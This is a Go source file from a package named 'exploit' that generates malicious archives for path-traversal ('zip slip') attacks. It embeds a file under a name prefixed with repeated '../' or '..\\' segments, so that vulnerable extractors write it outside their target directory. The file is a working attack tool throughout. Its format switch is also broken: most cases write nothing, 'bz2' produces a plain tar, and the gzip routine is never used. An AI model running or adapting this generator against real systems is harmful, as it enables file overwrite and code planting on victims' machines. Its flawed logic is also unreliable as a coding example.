package exploit

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"
	"time"

	"github.com/seaung/gagako/pkg/utils"
)

var (
	output    string
	platform  string
	prepath   string
	citerator string
	depth     int
)

func archivZip(filename string, out *os.File, content []byte) {
	zwrite := zip.NewWriter(out)
	defer zwrite.Close()

	ncontent, err := zwrite.Create(filename)
	if err != nil {
		utils.New().Warnning(fmt.Sprintf("can't created zip archive : %v\n", err))
		os.Exit(2)
	}

	_, err = ncontent.Write(content)
	if err != nil {
		utils.New().Warnning(fmt.Sprintf("can't created zip archive : %v\n", err))
		os.Exit(2)
	}

	if err = zwrite.Close(); err != nil {
		utils.New().Warnning(fmt.Sprintf("close zip archive error : %v\n", err))
		os.Exit(2)
	}
}

func tarArchive(filename string, out *os.File, content []byte) {
	tw := tar.NewWriter(out)
	defer tw.Close()

	header := &tar.Header{
		Name:    filename,
		Mode:    int64(os.ModePerm),
		Size:    int64(len(content)),
		ModTime: time.Now(),
	}

	if err := tw.WriteHeader(header); err != nil {
		utils.New().Info(fmt.Sprintf("write header error : %v\n", err))
		os.Exit(2)
	}

	if _, err := tw.Write(content); err != nil {
		utils.New().Info(fmt.Sprintf("write content error : %v\n", err))
		os.Exit(2)
	}

	if err := tw.Close(); err != nil {
		utils.New().Info(fmt.Sprintf("archive close error : %v\n", err))
		os.Exit(2)
	}
}

func gzArchive(filename string, out *os.File, content []byte) {
	gw := gzip.NewWriter(out)
	defer gw.Close()

	gw.Name = filename
	gw.Comment = "Why are doing?"
	gw.ModTime = time.Date(1977, time.May, 25, 0, 0, 0, 0, time.UTC)

	if _, err := gw.Write(content); err != nil {
		utils.New().LoggerError(fmt.Sprintf("write gz archive file error : %v\n", err))
		os.Exit(2)
	}

	if err := gw.Close(); err != nil {
		utils.New().LoggerError(fmt.Sprintf("close gz archive file error : %v\n", err))
		os.Exit(2)
	}
}

func ExploitArchive(output string, depth int, prepath, platform, inputfile string) {
	var iterator string

	gwd, err := os.Getwd()
	if err != nil {
		utils.New().LoggerError(fmt.Sprintf("Getwd error : %v\n", err))
		os.Exit(2)
	}

	input, err := ioutil.ReadFile(path.Join(gwd, inputfile))
	if err != nil {
		utils.New().LoggerError(fmt.Sprintf("read file error %v\n", err))
		os.Exit(2)
	}

	switch platform {
	case "windows":
		iterator = "..\\"
	case "linux":
		iterator = "../"
	}

	if citerator != "" {
		iterator = citerator
	}

	outpath := fmt.Sprintf("%s%s%s", strings.Repeat(iterator, depth), prepath, inputfile)
	utils.New().Success(fmt.Sprintf("the filename in the archive will be : %s\n", outpath))

	outfile, err := os.Create(output)
	if err != nil {
		utils.New().LoggerError(fmt.Sprintf("created file error : %v\n", err))
	}
	defer outfile.Close()

	extentions := strings.Split(output, ".")

	fileExtenstion := extentions[len(extentions)-1]

	switch fileExtenstion {
	default:
		utils.New().Info("Cloud not identify target format. Choose format : .zip, .jar, .tar, .gz, .tgz, .bz2")
		os.Exit(2)
	case "zip":
	case "jar":
		archivZip(outpath, outfile, input)
	case "tar":
	case "gz":
	case "tgz":
	case "bz2":
		tarArchive(outpath, outfile, input)

	}

	utils.New().Success(fmt.Sprintf("%s was written . \n", output))
}
